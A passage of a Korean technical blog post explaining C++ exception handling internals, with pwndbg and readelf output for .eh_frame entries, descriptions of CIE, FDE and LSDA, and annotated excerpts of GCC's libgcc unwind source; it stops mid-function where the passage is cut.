<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass func2</span><br><span class="line">Dump of assembler code for function func2(int):</span><br><span class="line">   0x0000000000401216 &lt;+0&gt;: endbr64</span><br><span class="line">   0x000000000040121a &lt;+4&gt;: push   rbp</span><br><span class="line">   0x000000000040121b &lt;+5&gt;: mov    rbp,rsp</span><br><span class="line">   0x000000000040121e &lt;+8&gt;: sub    rsp,0x10</span><br><span class="line">   ...</span><br><span class="line">   0x0000000000401266 &lt;+80&gt;:    leave</span><br><span class="line">   0x0000000000401267 &lt;+81&gt;:    ret</span><br></pre></td></tr></table></figure>
<p><code>grep</code> 을 사용하여 <code>readelf</code> 커맨드의 결과로부터 주소 <code>401216</code> 부터 시작하는 FDE를 검색합니다. <code>pc=0000000000401216..0000000000401268</code> 에서 이 FDE가 <code>func2</code> 함수의 주소 범위에 대응하는 엔트리임을 알 수 있으며, <code>cie=00000000</code> 에서 <code>CIE_id</code> 가 <code>00000000</code> 인 CIE에 종속됨을 알 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf --debug-dump=frames eh1 | grep 401216 -A 10</span><br><span class="line">000000e4 000000000000001c 000000e8 FDE cie=00000000 pc=0000000000401216..0000000000401268</span><br><span class="line">  DW_CFA_advance_loc: 5 to 000000000040121b</span><br><span class="line">  DW_CFA_def_cfa_offset: 16</span><br><span class="line">  DW_CFA_offset: r6 (rbp) at cfa-16</span><br><span class="line">  DW_CFA_advance_loc: 3 to 000000000040121e</span><br><span class="line">  DW_CFA_def_cfa_register: r6 (rbp)</span><br><span class="line">  DW_CFA_advance_loc1: 73 to 0000000000401267</span><br><span class="line">  DW_CFA_def_cfa: r7 (rsp) ofs 8</span><br><span class="line">  DW_CFA_nop</span><br><span class="line">  DW_CFA_nop</span><br></pre></td></tr></table></figure>
<p>FDE의 인스트럭션들을 보면 <code>DW_CFA_advance_loc</code> 을 통해 새로운 행을 만들고, <code>DW_CFA_def_cfa_offset</code> 등으로 CFA를 재정의하고 있습니다. 이는 해당 주소에서 <code>mov rbp,rsp</code> , <code>sub rsp,0x10</code> 와 같은 코드가 실행되어 CIE에서 CFA 계산의 기준이 되었던 <code>rsp</code> 의 값이 계속 바뀌기 때문입니다. <code>func2</code> 함수에 대해 CIE와 FDE의 인스트럭션을 종합하여 스택 되감기를 위한 테이블로 나타내면 다음과 같습니다.</p>
<p><img src="/images/cpp-exception-handling/7.png" alt="7.png"></p>
<h3 id="lsda" tabindex="-1">LSDA</h3>
<p>바이너리의 <code>.eh_frame</code> 섹션에 있는 CIE와 FDE를 참조하여 스택 되감기가 가능함을 확인하였습니다. 그런데 예외 처리를 위해서는 예외가 발생하였을 때 단순히 리턴 주소로 돌아가는 것이 아니라, 실행 흐름을 호출 스택 상에서 가장 가까운 랜딩 패드로 정확히 돌려야 합니다. 스택 되감기 이후에 추가적인 작업이 필요한 것입니다.</p>
<p>런타임에서 예외 발생 후 스택 되감기를 수행하고 나면, C++ 라이브러리에 구현된 함수가 개입하여 발생한 예외에 해당하는 랜딩 패드로 실행 흐름을 옮깁니다. 이 함수와 같이 특정 언어만의 예외 처리를 위해 제공된 함수를 personality 루틴이라고 합니다. Personality 루틴은 LSDA(language specific data area)라는 영역에 위치한 여러 가지 정보를 해석하여 적절한 랜딩 패드의 위치를 찾아냅니다. <code>g++</code> 컴파일러로 컴파일된 바이너리에서 LSDA는 <code>.gcc_except_table</code> 섹션에 위치합니다.</p>
<p>C++ 소스 코드상에서 각각의 함수는 서로 다른 LSDA를 가집니다. LSDA는 헤더와 call-site 테이블, 액션 테이블로 이루어져 있습니다. Personality 루틴은 LSDA 헤더를 읽어 함수 코드 내에서 랜딩 패드의 시작 오프셋을 얻습니다. 그리고 call-site 테이블에서 예외가 발생한 주소에 해당하는 레코드를 찾아 랜딩 패드 내에서 분기해야 할 최종 오프셋을 얻으며, action 테이블에서 해당하는 레코드의 오프셋을 얻어 실행 흐름을 돌릴 목적지가 catch 블록인지 cleanup 코드인지 구별합니다.</p>
<h2 id="itanium-c%2B%2B-abi" tabindex="-1">Itanium C++ ABI</h2>
<p>런타임에 실제로 스택 되감기와 예외 처리를 수행하는 로직은 인텔이 제안한 아이테니엄 C++ ABI의 예외 처리 부분을 구현한 라이브러리 함수들입니다. 아이테니엄 C++ ABI는 스택 되감기를 구현하는 unwind 라이브러리와, unwind 라이브러리를 기반으로 예외 처리 구현을 위해 작성된 C++ ABI로 구성되어 있습니다. Unwind 라이브러리와 C++ ABI의 소스 코드는 각각 GCC 프로젝트의 <code>libgcc</code> , <code>libstdc++-v3</code> 경로에 위치합니다.</p>
<p><div class="link-preview-widget"><a href="https://github.com/gcc-mirror/gcc" rel="noopener" target="_blank"><div class="link-preview-widget-title">GitHub - gcc-mirror/gcc</div><div class="link-preview-widget-description">Contribute to gcc-mirror/gcc development by creating an account on GitHub.</div><div class="link-preview-widget-url">GitHub</div></a><a class="link-preview-widget-image" href="https://github.com/gcc-mirror/gcc" rel="noopener" style="background-image: url('https://opengraph.githubassets.com/a96282e2e145d7525e5d04f0ad954e292a35cff365fe7854969789fbcf087bf8/gcc-mirror/gcc');" target="_blank"></a></div></p>
<h3 id="unwind-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC" tabindex="-1">Unwind 라이브러리</h3>
<p>Unwind 라이브러리에서 스택 되감기는 예외를 발생시키는 것으로 시작합니다. 예외 발생 시 예외 구조체가 전달되며, 라이브러리에서는 이를 다음의 두 단계에 걸쳐 처리합니다.</p>
<ol>
<li>search 단계
<ul>
<li>스택을 계속 되감으면서 personality 루틴을 반복하여 호출합니다. Personality 루틴이 랜딩 패드를 찾으면 성공하며, 찾지 못할 경우 예외 처리에 실패합니다. 이 단계는 스택을 되감으면서 각 프레임의 내용을 참조하지만, 실제로 실행 흐름까지 되돌리지는 않습니다.</li>
</ul>
</li>
<li>cleanup 단계
<ul>
<li>다시 스택을 되감으면서 personality 루틴을 반복하여 호출합니다. 랜딩 패드를 찾는 순간 레지스터 값들을 복원하여 실행 흐름을 랜딩 패드로 옮깁니다.</li>
</ul>
</li>
</ol>
<p>Unwind 라이브러리에서 사용하는 중요한 구조체로는 <code>_Unwind_Exception</code> 과 <code>_Unwind_Context</code> 가 있습니다. <code>_Unwind_Exception</code> 는 발생한 예외를 나타내는 구조체입니다. 구조체에서 <code>exception_class</code> 필드는 예외를 발생시킨 프로그래밍 언어와 구현체에 대한 정보를 나타내며, C++ 예외는 하위 4바이트가 <code>&quot;C++\0&quot;</code> 로 되어 있습니다. 나머지 필드는 Java와 같은 외부 언어에서 발생한 예외와 관련된 필드입니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The unwind interface uses a pointer to an exception header object</span></span><br><span class="line"><span class="comment">   as its representation of an exception being thrown. In general, the</span></span><br><span class="line"><span class="comment">   full representation of an exception object is language- and</span></span><br><span class="line"><span class="comment">   implementation-specific, but it will be prefixed by a header</span></span><br><span class="line"><span class="comment">   understood by the unwind interface.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_Unwind_Exception</span></span><br><span class="line">&#123;</span><br><span class="line">  _Unwind_Exception_Class exception_class;</span><br><span class="line">  _Unwind_Exception_Cleanup_Fn exception_cleanup;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined (__USING_SJLJ_EXCEPTIONS__) &amp;&amp; defined (__SEH__)</span></span><br><span class="line">  _Unwind_Word private_[<span class="number">6</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  _Unwind_Word private_1;</span><br><span class="line">  _Unwind_Word private_2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* @@@ The IA-64 ABI says that this structure must be double-word aligned.</span></span><br><span class="line"><span class="comment">     Taking that literally does not make much sense generically.  Instead we</span></span><br><span class="line"><span class="comment">     provide the maximum alignment required by any type for the machine.  */</span></span><br><span class="line">&#125; __attribute__((__aligned__));</span><br></pre></td></tr></table></figure>
<p><code>_Unwind_Context</code> 는 특정 프레임에서 레지스터들의 값과 CFA, 리턴 주소 등 스택 되감기를 위해 필요한 정보들을 나타내는 구조체입니다. <code>reg</code> 배열은 호출 프레임 테이블에서 R1, … , R16 레지스터의 값에 해당합니다. <code>cfa</code> 와 <code>ra</code> 필드는 각각 CFA와 리턴 주소를 가리킵니다. <code>lsda</code> 필드에는 런타임에 LSDA의 주소를 찾아 대입합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is the register and unwind state for a particular frame.  This</span></span><br><span class="line"><span class="comment">   provides the information necessary to unwind up past a frame and return</span></span><br><span class="line"><span class="comment">   to its caller.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> &#123;</span><br><span class="line">    _Unwind_Context_Reg_Val reg[__LIBGCC_DWARF_FRAME_REGISTERS__ + <span class="number">1</span>];</span><br><span class="line">    <span class="type">void</span> *cfa;</span><br><span class="line">    <span class="type">void</span> *ra;</span><br><span class="line">    <span class="type">void</span> *lsda;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">dwarf_eh_bases</span> bases;</span><br><span class="line">    <span class="comment">/* Signal frame context.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIGNAL_FRAME_BIT ((~(_Unwind_Word)0 &gt;&gt; 1) + 1)</span></span><br><span class="line">    <span class="comment">/* Context which has version/args_size/by_value fields.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXTENDED_CONTEXT_BIT ((~(_Unwind_Word)0 &gt;&gt; 2) + 1)</span></span><br><span class="line">    <span class="comment">/* Bit reserved on AArch64, return address has been signed with A or B</span></span><br><span class="line"><span class="comment">       key.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RA_SIGNED_BIT ((~(_Unwind_Word)0 &gt;&gt; 3) + 1)</span></span><br><span class="line">    _Unwind_Word flags;</span><br><span class="line">    <span class="comment">/* 0 for now, can be increased when further fields are added to</span></span><br><span class="line"><span class="comment">       struct _Unwind_Context.  */</span></span><br><span class="line">    _Unwind_Word version;</span><br><span class="line">    _Unwind_Word args_size;</span><br><span class="line">    <span class="type">char</span> by_value[__LIBGCC_DWARF_FRAME_REGISTERS__ + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>이외에도 CIE와 FDE의 인스트럭션을 해석하여 구성한 호출 프레임 테이블의 행을 나타내는 <code>_Unwind_FrameState</code> 구조체가 있습니다. 아래 정의에서 <code>reg</code> 배열은 R1, … , RN 레지스터들의 값을 복원해야 하는지, 복원한다면 CFA와 오프셋을 기준으로 복원하는지, 다른 레지스터의 값으로 복원하는지 등의 방법을 나타냅니다. <code>cfa_offset</code> 과 <code>cfa_reg</code> 필드는 CFA를 정의하는 레지스터와 오프셋을 나타냅니다. <code>personality</code> 필드에는 런타임에 CIE의 <code>augmentation</code> 필드를 읽고 personality 루틴의 주소를 대입합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The result of interpreting the frame unwind info for a frame.</span></span><br><span class="line"><span class="comment">   This is all symbolic at this point, as none of the values can</span></span><br><span class="line"><span class="comment">   be resolved until the target pc is located.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Each register save state can be described in terms of a CFA slot,</span></span><br><span class="line"><span class="comment">     another register, or a location expression.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">frame_state_reg_info</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">struct</span> &#123;</span><br><span class="line">      <span class="keyword">union</span> &#123;</span><br><span class="line">	_Unwind_Word reg;</span><br><span class="line">	_Unwind_Sword offset;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *exp;</span><br><span class="line">      &#125; loc;</span><br><span class="line">      <span class="keyword">enum</span> &#123;</span><br><span class="line">	REG_UNSAVED,</span><br><span class="line">	REG_SAVED_OFFSET,</span><br><span class="line">	REG_SAVED_REG,</span><br><span class="line">	REG_SAVED_EXP,</span><br><span class="line">	REG_SAVED_VAL_OFFSET,</span><br><span class="line">	REG_SAVED_VAL_EXP,</span><br><span class="line">	REG_UNDEFINED</span><br><span class="line">      &#125; how;</span><br><span class="line">    &#125; reg[__LIBGCC_DWARF_FRAME_REGISTERS__+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used to implement DW_CFA_remember_state.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">frame_state_reg_info</span> *prev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The CFA can be described in terms of a reg+offset or a</span></span><br><span class="line"><span class="comment">       location expression.  */</span></span><br><span class="line">    _Unwind_Sword cfa_offset;</span><br><span class="line">    _Unwind_Word cfa_reg;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *cfa_exp;</span><br><span class="line">    <span class="keyword">enum</span> &#123;</span><br><span class="line">      CFA_UNSET,</span><br><span class="line">      CFA_REG_OFFSET,</span><br><span class="line">      CFA_EXP</span><br><span class="line">    &#125; cfa_how;</span><br><span class="line">  &#125; regs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The PC described by the current frame state.  */</span></span><br><span class="line">  <span class="type">void</span> *pc;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The information we care about from the CIE/FDE.  */</span></span><br><span class="line">  _Unwind_Personality_Fn personality;</span><br><span class="line">  _Unwind_Sword data_align;</span><br><span class="line">  _Unwind_Word code_align;</span><br><span class="line">  _Unwind_Word retaddr_column;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> fde_encoding;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> lsda_encoding;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> saw_z;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> signal_frame;</span><br><span class="line">  <span class="type">void</span> *eh_ptr;</span><br><span class="line">&#125; _Unwind_FrameState;</span><br></pre></td></tr></table></figure>
<p>이제 Unwind 라이브러리에서 예외를 처리하는 함수들이 어떻게 구현되어 있는지 살펴보겠습니다. 라이브러리에서 반환값이 있는 대부분의 함수는 <code>_Unwind_Reason_Code</code> 열거형을 반환합니다. 각각의 값들은 합수의 성공 및 실패 여부, 스택 되감기를 계속 수행해야 하는지 등을 나타냅니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The unwind interface uses reason codes in several contexts to</span></span><br><span class="line"><span class="comment">   identify the reasons for failures or other actions.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">  _URC_NO_REASON = <span class="number">0</span>,</span><br><span class="line">  _URC_FOREIGN_EXCEPTION_CAUGHT = <span class="number">1</span>,</span><br><span class="line">  _URC_FATAL_PHASE2_ERROR = <span class="number">2</span>,</span><br><span class="line">  _URC_FATAL_PHASE1_ERROR = <span class="number">3</span>,</span><br><span class="line">  _URC_NORMAL_STOP = <span class="number">4</span>,</span><br><span class="line">  _URC_END_OF_STACK = <span class="number">5</span>,</span><br><span class="line">  _URC_HANDLER_FOUND = <span class="number">6</span>,</span><br><span class="line">  _URC_INSTALL_CONTEXT = <span class="number">7</span>,</span><br><span class="line">  _URC_CONTINUE_UNWIND = <span class="number">8</span></span><br><span class="line">&#125; _Unwind_Reason_Code;</span><br></pre></td></tr></table></figure>
<p><code>_Unwind_RaiseException</code> 함수는 <code>_Unwind_Exception</code> 구조체를 받아 예외를 일으키는 함수입니다. 10행은 <code>this_context</code> 와 <code>cur_context</code> 를 현재 스택 프레임의 내용으로 초기화합니다. 15행은 search 단계에 해당하는 반복문으로, personality 루틴이 랜딩 패드를 찾아낸 경우에만 탈출할 수 있습니다. 20행은 <code>cur_context</code> 프레임에 해당하는 CIE와 FDE를 읽고 <code>_Unwind_FrameState</code> 구조체 <code>fs</code> 를 초기화하는 내장 함수를 호출합니다. 32행은 personality 루틴이 있다면 호출합니다. 42행은 <code>fs</code> 를 반영하여 <code>cur_context</code> 가 이전 프레임의 내용을 나타내도록 합니다.</p>
<p>반복문 이후는 cleanup 단계를 수행하고 실행 흐름을 되돌리는 부분입니다. 51행은 <code>_Unwind_RaiseException_Phase2</code> 함수를 호출하여 cleanup 단계를 수행합니다. 이 함수가 반환하면 <code>cur_context</code> 는 실행 흐름을 옮길 랜딩 패드의 내용을, <code>frames</code> 변수는 되감아야 할 스택 프레임의 개수를 나타내게 됩니다. 55행은 <code>cur_context</code> 의 내용을 실제 레지스터에 반영하여 실행 흐름을 옮기는 매크로를 호출합니다. 따라서 랜딩 패드를 찾지 못하는 등의 실패가 발생하지 않는 이상 <code>_Unwind_RaiseException</code> 함수는 반환하지 않으며, 랜딩 패드로 곧바로 분기하여 실행 흐름을 이어갑니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Raise an exception, passing along the given exception object.  */</span></span><br><span class="line"></span><br><span class="line">_Unwind_Reason_Code LIBGCC2_UNWIND_ATTRIBUTE</span><br><span class="line">_Unwind_RaiseException(<span class="keyword">struct</span> _Unwind_Exception *exc) &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_Unwind_Context</span> this_context, cur_context;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Set up this_context to describe the current stack frame.  */</span></span><br><span class="line">    <span class="built_in">uw_init_context</span>(&amp;this_context);</span><br><span class="line">    cur_context = this_context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 1: Search.  Unwind the stack, calling the personality routine</span></span><br><span class="line"><span class="comment">       with the _UA_SEARCH_PHASE flag set.  Do not modify the stack yet.  */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        _Unwind_FrameState fs;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set up fs to describe the FDE for the caller of cur_context.  The</span></span><br><span class="line"><span class="comment">       first time through the loop, that means __cxa_throw.  */</span></span><br><span class="line">        code = <span class="built_in">uw_frame_state_for</span>(&amp;cur_context, &amp;fs);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code == _URC_END_OF_STACK)</span><br><span class="line">            <span class="comment">/* Hit end of stack with no handler found.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">            <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">               diagnose these and merely crashes.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fs.personality) &#123;</span><br><span class="line">            code = (*fs.personality)(<span class="number">1</span>, _UA_SEARCH_PHASE, exc-&gt;exception_class,</span><br><span class="line">                                     exc, &amp;cur_context);</span><br><span class="line">            <span class="keyword">if</span> (code == _URC_HANDLER_FOUND)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">                <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Update cur_context to describe the same frame as fs.  */</span></span><br><span class="line">        <span class="built_in">uw_update_context</span>(&amp;cur_context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Indicate to _Unwind_Resume and associated subroutines that this</span></span><br><span class="line"><span class="comment">       is not a forced unwind.  Further, note where we found a handler.  */</span></span><br><span class="line">    exc-&gt;private_1 = <span class="number">0</span>;</span><br><span class="line">    exc-&gt;private_2 = <span class="built_in">uw_identify_context</span>(&amp;cur_context);</span><br><span class="line"></span><br><span class="line">    cur_context = this_context;</span><br><span class="line">    code = _Unwind_RaiseException_Phase2(exc, &amp;cur_context, &amp;frames);</span><br><span class="line">    <span class="keyword">if</span> (code != _URC_INSTALL_CONTEXT)</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">uw_install_context</span>(&amp;this_context, &amp;cur_context, frames);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>uw_frame_state_for</code> 내장 함수는 <code>_Unwind_Context</code> 구조체 <code>context</code> 를 받아 프레임에 해당하는 CIE와 FDE의 호출 프레임 인스트럭션을 해석하여 <code>_Unwind_FrameState</code> 구조체 <code>fs</code> 를 초기화합니다. 19행과 34행에서 CIE와 FDE의 주소를 찾고, 35행에서 <code>extract_cie_info</code> 내장 함수를 호출하여 CIE의 필드를 읽고 <code>fs</code> 구조체에서 해당하는 값들을 초기화합니다. <code>fs</code> 의 <code>personality</code> 필드는 이 함수 내에서 초기화됩니다. 이후 42행과 64행에서 <code>execute_cfa_program</code> 내장 함수를 호출하여 호출 프레임 인스트럭션을 해석하고 CFA 및 레지스터들과 관련된 내용을 초기화합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Given the _Unwind_Context CONTEXT for a stack frame, look up the FDE for</span></span><br><span class="line"><span class="comment">   its caller and decode it into FS.  This function also sets the</span></span><br><span class="line"><span class="comment">   args_size and lsda members of CONTEXT, as they are really information</span></span><br><span class="line"><span class="comment">   about the caller&#x27;s frame.  */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> _Unwind_Reason_Code</span></span><br><span class="line"><span class="function"><span class="title">uw_frame_state_for</span><span class="params">(<span class="keyword">struct</span> _Unwind_Context *context, _Unwind_FrameState *fs)</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">dwarf_fde</span> *fde;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">dwarf_cie</span> *cie;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *aug, *insn, *end;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fs, <span class="number">0</span>, <span class="built_in">sizeof</span>(*fs));</span><br><span class="line">    context-&gt;args_size = <span class="number">0</span>;</span><br><span class="line">    context-&gt;lsda = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;ra == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"></span><br><span class="line">    fde = _Unwind_Find_FDE(context-&gt;ra + _Unwind_IsSignalFrame(context) - <span class="number">1</span>,</span><br><span class="line">                           &amp;context-&gt;bases);</span><br><span class="line">    <span class="keyword">if</span> (fde == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> MD_FALLBACK_FRAME_STATE_FOR</span></span><br><span class="line">        <span class="comment">/* Couldn&#x27;t find frame unwind info for this function.  Try a</span></span><br><span class="line"><span class="comment">       target-specific fallback mechanism.  This will necessarily</span></span><br><span class="line"><span class="comment">       not provide a personality routine or LSDA.  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MD_FALLBACK_FRAME_STATE_FOR</span>(context, fs);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="keyword">return</span> _URC_END_OF_STACK;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs-&gt;pc = context-&gt;bases.func;</span><br><span class="line"></span><br><span class="line">    cie = <span class="built_in">get_cie</span>(fde);</span><br><span class="line">    insn = <span class="built_in">extract_cie_info</span>(cie, context, fs);</span><br><span class="line">    <span class="keyword">if</span> (insn == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="comment">/* CIE contained unknown augmentation.  */</span></span><br><span class="line">        <span class="keyword">return</span> _URC_FATAL_PHASE1_ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First decode all the insns in the CIE.  */</span></span><br><span class="line">    end = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">next_fde</span>((<span class="type">const</span> <span class="keyword">struct</span> dwarf_fde *)cie);</span><br><span class="line">    <span class="built_in">execute_cfa_program</span>(insn, end, context, fs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Locate augmentation for the fde.  */</span></span><br><span class="line">    aug = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)fde + <span class="built_in">sizeof</span>(*fde);</span><br><span class="line">    aug += <span class="number">2</span> * <span class="built_in">size_of_encoded_value</span>(fs-&gt;fde_encoding);</span><br><span class="line">    insn = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (fs-&gt;saw_z) &#123;</span><br><span class="line">        <span class="type">_uleb128_t</span> i;</span><br><span class="line">        aug = <span class="built_in">read_uleb128</span>(aug, &amp;i);</span><br><span class="line">        insn = aug + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fs-&gt;lsda_encoding != DW_EH_PE_omit) &#123;</span><br><span class="line">        _Unwind_Ptr lsda;</span><br><span class="line"></span><br><span class="line">        aug = <span class="built_in">read_encoded_value</span>(context, fs-&gt;lsda_encoding, aug, &amp;lsda);</span><br><span class="line">        context-&gt;lsda = (<span class="type">void</span> *)lsda;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Then the insns in the FDE up to our target PC.  */</span></span><br><span class="line">    <span class="keyword">if</span> (insn == <span class="literal">NULL</span>)</span><br><span class="line">        insn = aug;</span><br><span class="line">    end = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">next_fde</span>(fde);</span><br><span class="line">    <span class="built_in">execute_cfa_program</span>(insn, end, context, fs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _URC_NO_REASON;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_Unwind_RaiseException_Phase2</code> 함수는 cleanup 단계를 분리하여 작성한 함수입니다. 전반적인 로직은 호출자인 <code>_Unwind_RaiseException</code> 함수와 거의 동일합니다. <code>frames</code> 변수를 통해 되감을 스택 프레임의 개수를 세고, personality 루틴을 호출할 때 <code>_UA_CLEANUP_PHASE</code> 플래그를 전달하여 cleanup 단계임을 알 수 있도록 하는 차이가 있습니다. Personality 루틴이 랜딩 패드를 찾아 <code>_URC_INSTALL_CONTEXT</code> 코드를 반환하면 반복문을 탈출합니다.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Subroutine of _Unwind_RaiseException also invoked from _Unwind_Resume.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Unwind the stack calling the personality routine to find both the</span></span><br><span class="line"><span class="comment">   exception handler and intermediary cleanup code.  We&#x27;ll only locate</span></span><br><span class="line"><span class="comment">   the first such frame here.  Cleanup code will call back into</span></span><br><span class="line"><span class="comment">   _Unwind_Resume and we&#x27;ll continue Phase 2 there.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException_Phase2(<span class="keyword">struct</span> _Unwind_Exception *exc,</span><br><span class="line">                              <span class="keyword">struct</span> _Unwind_Context *context,</span><br><span class="line">                              <span class="type">unsigned</span> <span class="type">long</span> *frames_p) &#123;</span><br><span class="line">    _Unwind_Reason_Code code;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> frames = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        _Unwind_FrameState fs;</span><br><span class="line">        <span class="type">int</span> match_handler;</span><br><span class="line"></span><br><span class="line">        code = <span class="built_in">uw_frame_state_for</span>(context, &amp;fs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Identify when we&#x27;ve reached the designated handler context.  */</span></span><br><span class="line">        match_handler = (<span class="built_in">uw_identify_context</span>(context) == exc-&gt;private_2</span><br><span class="line">                             ? _UA_HANDLER_FRAME</span><br><span class="line">                             : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">            <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">               diagnose these and merely crashes.  */</span></span><br><span class="line">            <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fs.personality) &#123;</span><br><span class="line">            code = (*fs.personality)(<span class="number">1</span>, _UA_CLEANUP_PHASE | match_handler,</span><br><span class="line">                                     exc-&gt;exception_class, exc, context);</span><br><span class="line">            <span class="keyword">if</span> (code == _URC_INSTALL_CONTEXT)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND)</span><br><span class="line">                